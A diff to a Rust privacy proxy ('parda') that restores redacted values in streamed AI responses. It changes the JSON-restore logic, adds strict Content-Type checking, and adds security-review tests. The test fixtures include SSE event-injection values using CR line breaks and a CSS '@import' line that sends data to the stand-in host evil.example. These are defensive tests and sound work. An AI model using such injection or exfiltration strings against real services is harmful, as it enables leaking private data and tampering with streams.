@@ -20,8 +20,9 @@
 //!
 //! Which answers are restored at all is decided per endpoint
 //! ([`crate::sites::restore_rule`]); [`for_stream_only`] is the rewriter for
-//! sites whose answers are restored only when they stream (a single JSON
-//! document or a text body passes through there).
+//! sites whose answers are restored only when they stream: event streams
+//! and NDJSON types; any JSON-typed body (even one holding several values)
+//! or text body passes through there.
 //!
 //! Real values only ever land inside parsed JSON strings (re-serialised),
 //! JSON-escaped in streamed JSON fragments, or in plain text; JSON carried
@@ -100,9 +101,10 @@ pub(crate) fn for_content_type_capped(
 }
 
 /// A rewriter for one streamed answer: like [`for_content_type`] for
-/// `text/event-stream`, NDJSON and several JSON values under a JSON type,
-/// but a single JSON document (Google frames included), a text body or any
-/// other type passes through unrestored.
+/// `text/event-stream` and NDJSON types; anything under a JSON type (one
+/// document, Google frames, or a document followed by more lines, as a
+/// GraphQL answer ends in `{"extensions":…}`), a text body or any other
+/// type passes through unrestored.
 pub(crate) fn for_stream_only(
     engine: &Engine,
     scope: &str,
@@ -111,8 +113,8 @@ pub(crate) fn for_stream_only(
     build(engine, scope, content_type, MAX_ITEM_BYTES, false)
 }
 
-/// The rewriter for `content_type`; `documents`: whether single JSON
-/// documents and text bodies are restored too.
+/// The rewriter for `content_type`; `documents`: whether JSON and text
+/// bodies are restored too (else only event streams and NDJSON types).
 fn build(
     engine: &Engine,
     scope: &str,
@@ -138,8 +140,8 @@ fn build(
         | "application/jsonl"
         | "application/x-jsonlines"
         | "application/stream+json" => Box::new(NdjsonRestore::new(engine, scope, cap)),
-        m if m == "application/json" || m == "text/json" || m.ends_with("+json") => {
-            Box::new(JsonRestore::new(engine, scope, cap, documents))
+        m if documents && (m == "application/json" || m == "text/json" || m.ends_with("+json")) => {
+            Box::new(JsonRestore::new(engine, scope, cap))
         }
         "text/plain" if documents => Box::new(PlainRestore {
             engine: engine.clone(),
@@ -148,6 +150,52 @@ fn build(
         }),
         _ => Box::new(Passthrough),
     }
+}
+
+/// The `Content-Type` a response is restored by: `""` when there is none,
+/// the first one when every one has the same media type (ASCII case and
+/// parameters aside), and `None` (the body passes through unrestored, as a
+/// client may read it by another type than parda did) when several
+/// disagree, or when one is empty, does not parse, or lists several types
+/// (a comma outside a quoted string).
+pub(crate) fn response_content_type(headers: &http::HeaderMap) -> Option<String> {
+    let mut values = headers.get_all(http::header::CONTENT_TYPE).iter();
+    let Some(first) = values.next() else {
+        return Some(String::new());
+    };
+    let want = media_type(first)?;
+    if values.any(|v| media_type(v).as_ref() != Some(&want)) {
+        return None;
+    }
+    first.to_str().ok().map(str::to_string)
+}
+
+/// The lowercased `type/subtype` of one `Content-Type` value; `None` when
+/// it is not visible ASCII, has a comma outside a quoted string or an
+/// unterminated quote, or does not start with `type/subtype` (tokens).
+fn media_type(v: &http::HeaderValue) -> Option<String> {
+    let s = v.to_str().ok()?;
+    let (mut quoted, mut escaped) = (false, false);
+    for c in s.chars() {
+        match (quoted, escaped, c) {
+            (true, true, _) => escaped = false,
+            (true, false, '\\') => escaped = true,
+            (_, false, '"') => quoted = !quoted,
+            (false, _, ',') => return None,
+            _ => {}
+        }
+    }
+    if quoted {
+        return None;
+    }
+    let media = s.split(';').next().unwrap_or("").trim();
+    let token = |t: &str| {
+        !t.is_empty()
+            && t.chars()
+                .all(|c| c.is_ascii_alphanumeric() || "!#$%&'*+-.^_`|~".contains(c))
+    };
+    let (ty, sub) = media.split_once('/')?;
+    (token(ty) && token(sub)).then(|| media.to_ascii_lowercase())
 }
 
 /// A rewriter that changes nothing.
@@ -618,7 +666,7 @@ impl PlainRestore {
                 out
             }
             PlainKind::Json => {
-                let mut j = JsonRestore::new(&self.engine, &self.scope, MAX_ITEM_BYTES, true);
+                let mut j = JsonRestore::new(&self.engine, &self.scope, MAX_ITEM_BYTES);
                 let out = j.push(&held).to_vec();
                 self.mode = PlainMode::Json(j);
                 out
@@ -678,8 +726,6 @@ enum JsonMode {
     Frames(Frames),
     /// Several JSON values one per line: an NDJSON stream after all.
     Lines(NdjsonRestore),
-    /// Passed through unrestored (a document where only streams are).
-    Raw,
 }
 
 /// Where the first top-level JSON value of a body ends, and whether
@@ -754,19 +800,15 @@ struct JsonRestore {
     engine: Engine,
     scope: String,
     cap: usize,
-    /// False: only a stream of JSON values is restored; one document (or
-    /// Google frames) passes through as it came.
-    documents: bool,
     mode: JsonMode,
 }
 
 impl JsonRestore {
-    fn new(engine: &Engine, scope: &str, cap: usize, documents: bool) -> Self {
+    fn new(engine: &Engine, scope: &str, cap: usize) -> Self {
         JsonRestore {
             engine: engine.clone(),
             scope: scope.to_string(),
             cap,
-            documents,
             mode: JsonMode::Buffer(Vec::new(), TopLevel::default()),
         }
     }
@@ -778,7 +820,6 @@ impl StreamTransform for JsonRestore {
             JsonMode::Stream(s) => return Bytes::from(s.push_bytes(chunk)),
             JsonMode::Frames(f) => return Bytes::from(f.push(chunk)),
             JsonMode::Lines(l) => return l.push(chunk),
-            JsonMode::Raw => return Bytes::copy_from_slice(chunk),
             JsonMode::Buffer(buf, top) => {
                 buf.extend_from_slice(chunk);
                 (buf, top)
@@ -786,10 +827,6 @@ impl StreamTransform for JsonRestore {
         };
         if buf.len() >= XSSI_PREFIX.len() && buf.starts_with(XSSI_PREFIX) {
             let held = std::mem::take(buf);
-            if !self.documents {
-                self.mode = JsonMode::Raw;
-                return Bytes::from(held);
-            }
             // JSON inside text, sent in pieces: frame by frame.
             let mut frames = Frames::new(&self.engine, &self.scope, self.cap);
             let out = frames.push(&held);
@@ -803,12 +840,6 @@ impl StreamTransform for JsonRestore {
             let out = lines.push(&held);
             self.mode = JsonMode::Lines(lines);
             return out;
-        }
-        if !self.documents && (top.scalar || buf.len() > MAX_JSON_BUFFER) {
-            // One value, never restored here: no need to hold it longer.
-            let held = std::mem::take(buf);
-            self.mode = JsonMode::Raw;
-            return Bytes::from(held);
         }
         if buf.len() <= MAX_JSON_BUFFER {
             return Bytes::new();
@@ -825,12 +856,8 @@ impl StreamTransform for JsonRestore {
             JsonMode::Stream(s) => Bytes::from(s.finish_bytes()),
             JsonMode::Frames(f) => Bytes::from(f.finish()),
             JsonMode::Lines(l) => l.finish(),
-            JsonMode::Raw => Bytes::new(),
             JsonMode::Buffer(buf, _) => {
                 let raw = std::mem::take(buf);
-                if !self.documents {
-                    return Bytes::from(raw);
-                }
                 if raw.starts_with(XSSI_PREFIX) {
                     let mut frames = Frames::new(&self.engine, &self.scope, self.cap);
                     let mut out = frames.push(&raw);
@@ -4215,6 +4242,163 @@ mod tests {
         assert_eq!(last["t"], "ravi@example.com");
     }
 
+    /// Review F5: Content-Type headers that disagree restore nothing.
+    #[test]
+    fn disagreeing_content_types_restore_nothing() {
+        use http::HeaderValue;
+        let ct = |vals: &[&[u8]]| {
+            let mut h = http::HeaderMap::new();
+            for v in vals {
+                h.append(
+                    http::header::CONTENT_TYPE,
+                    HeaderValue::from_bytes(v).unwrap(),
+                );
+            }
+            response_content_type(&h)
+        };
+        assert_eq!(ct(&[]).as_deref(), Some(""));
+        assert_eq!(
+            ct(&[b"text/event-stream; charset=utf-8"]).as_deref(),
+            Some("text/event-stream; charset=utf-8")
+        );
+        assert_eq!(
+            ct(&[b"Application/JSON", b"application/json ; charset=utf-8"]).as_deref(),
+            Some("Application/JSON")
+        );
+        for vals in [
+            &[&b"application/json"[..], b"text/html"][..],
+            &[b"text/event-stream", b"application/json"],
+            &[b"application/json", b"application/json", b"text/plain"],
+            &[b"application/json", b""],
+            &[b"application/json", b"application/json\xff"],
+            &[b"application/json\xff", b"application/json\xff"],
+        ] {
+            assert_eq!(ct(vals), None, "{vals:?}");
+        }
+        // One header holding several types (a comma outside a quoted
+        // string), or one that is empty or does not parse, restores nothing.
+        for v in [
+            &b"text/event-stream, text/html"[..],
+            b"application/json,text/html",
+            b"application/json,",
+            b",application/json",
+            b"text/plain; x=\"a,b\", text/html",
+            b"text/plain; x=\"a,b",
+            b"",
+            b"   ",
+            b"application/json\xff",
+            b"json",
+            b"/json",
+            b"application/",
+            b"application/json/x",
+            b"application json",
+        ] {
+            assert_eq!(ct(&[v]), None, "{:?}", String::from_utf8_lossy(v));
+        }
+        // A comma inside a quoted parameter value is not a list.
+        for v in [
+            "text/plain; x=\"a,b\"",
+            "text/plain; x=\"a\\\",b\"; charset=utf-8",
+            "application/json;charset=utf-8",
+        ] {
+            assert_eq!(ct(&[v.as_bytes()]).as_deref(), Some(v), "{v}");
+        }
+    }
+
+    /// Values with CR, CR CR and CRLF (an SSE reader ends a line at each).
+    const CR_VALUES: [&str; 3] = [
+        "Lotus\rTowers Pune",
+        "Flat 4\r\rdata: {\"injected\":true}",
+        "Lotus\r\nevent: pwn",
+    ];
+
+    /// An engine that knows [`CR_VALUES`]; their tags in the global scope.
+    fn cr_engine(dir: &std::path::Path) -> (Engine, Vec<String>) {
+        let mut config = parda_core::Config::default();
+        config.detect.model = "none".into();
+        let e = Engine::open(
+            parda_engine::EngineOptions {
+                config,
+                rules: parda_detect::RulesFile {
+                    term: CR_VALUES
+                        .iter()
+                        .map(|t| parda_detect::Term {
+                            text: (*t).into(),
+                            ..Default::default()
+                        })
+                        .collect(),
+                    ..Default::default()
+                },
+                data_dir: dir.join("data"),
+                use_keyring: false,
+            },
+            None,
+        )
+        .unwrap();
+        let tags = CR_VALUES
+            .iter()
+            .map(|v| {
+                let tag = e.redact(v, SCOPE).unwrap().text;
+                assert!(!tag.contains(['\r', '\n']), "{v:?} -> {tag:?}");
+                tag
+            })
+            .collect();
+        (e, tags)
+    }
+
+    /// Review F1: a restored value holding CR went out inside a `data:`
+    /// line, and a reader (lines end at CRLF, CR or LF) split or ended the
+    /// event there. Each piece is a `data:` line of its own.
+    #[test]
+    fn restored_line_breaks_never_split_sse_events() {
+        let dir = tempfile::tempdir().unwrap();
+        let (e, tags) = cr_engine(dir.path());
+        for (v, tag) in CR_VALUES.iter().zip(&tags) {
+            let lf = v.replace("\r\n", "\n").replace('\r', "\n");
+            // Plain-text event data.
+            let body = format!("data: hi {tag} bye\n\ndata: [DONE]\n\n");
+            for n in [1, 3, 1000] {
+                let out = run(&e, "text/event-stream", body.as_bytes(), n);
+                let evs: Vec<(Option<String>, String)> = events(&out)
+                    .into_iter()
+                    .map(|e| (e.event, e.data))
+                    .collect();
+                assert_eq!(
+                    evs,
+                    [(None, format!("hi {lf} bye")), (None, "[DONE]".into())],
+                    "{v:?} {n}: {:?}",
+                    String::from_utf8_lossy(&out)
+                );
+            }
+            // A chatgpt.com delta stream (JSON data: escaped, kept exact).
+            let pieces = ["Note: ", tag.as_str(), " ok"];
+            let body = chatgpt_stream(&pieces);
+            for n in [1, 4, 1000] {
+                let out = run(&e, "text/event-stream", &body, n);
+                assert_eq!(events(&out).len(), events(&body).len(), "{v:?} {n}");
+                assert_eq!(chatgpt_text(&out), format!("Note: {v} ok"), "{v:?} {n}");
+            }
+            // Plain-text data of a delta stream's own events.
+            let body = sse(&[
+                (Some("delta"), format!("text {tag}")),
+                (None, "[DONE]".into()),
+            ]);
+            let out = run(&e, "text/event-stream", &body, 2);
+            let evs: Vec<(Option<String>, String)> = events(&out)
+                .into_iter()
+                .map(|e| (e.event, e.data))
+                .collect();
+            assert_eq!(
+                evs,
+                [
+                    (Some("delta".into()), format!("text {lf}")),
+                    (None, "[DONE]".into())
+                ],
+                "{v:?}"
+            );
+        }
+    }
+
     /// Split `text` at the char boundaries in `cuts` (byte offsets, any order).
     fn split_at(text: &str, cuts: &[usize]) -> Vec<String> {
         let mut at: Vec<usize> = cuts
@@ -4511,8 +4695,6 @@ mod tests {
             "<style>@import url('//evil.example/?d= {b}[NAME_1]');</style>",
         ];
         for t in templates {
-            // Plain-text URLs are the engine's run rule, not the guard's.
-            let syntax = !t.starts_with("www.");
             for b in boundary_chars() {
                 let text = t.replace("{b}", &b.to_string());
                 let label = format!("{t:?} with U+{:04X}", b as u32);
@@ -4541,21 +4723,17 @@ mod tests {
                         &chatgpt_text(&out),
                         &format!("{what} (delta sse)"),
                     );
-                    if syntax {
-                        assert_no_real_value_in_urls(
-                            &guard_only(&e, &pieces),
-                            &format!("{what} (guard alone)"),
-                        );
-                    }
-                }
-                if syntax {
-                    let chars: Vec<String> = text.chars().map(String::from).collect();
-                    let refs: Vec<&str> = chars.iter().map(String::as_str).collect();
                     assert_no_real_value_in_urls(
-                        &guard_only(&e, &refs),
-                        &format!("{label} (guard alone, char by char)"),
+                        &guard_only(&e, &pieces),
+                        &format!("{what} (guard alone)"),
                     );
                 }
+                let chars: Vec<String> = text.chars().map(String::from).collect();
+                let refs: Vec<&str> = chars.iter().map(String::as_str).collect();
+                assert_no_real_value_in_urls(
+                    &guard_only(&e, &refs),
+                    &format!("{label} (guard alone, char by char)"),
+                );
             }
         }
     }
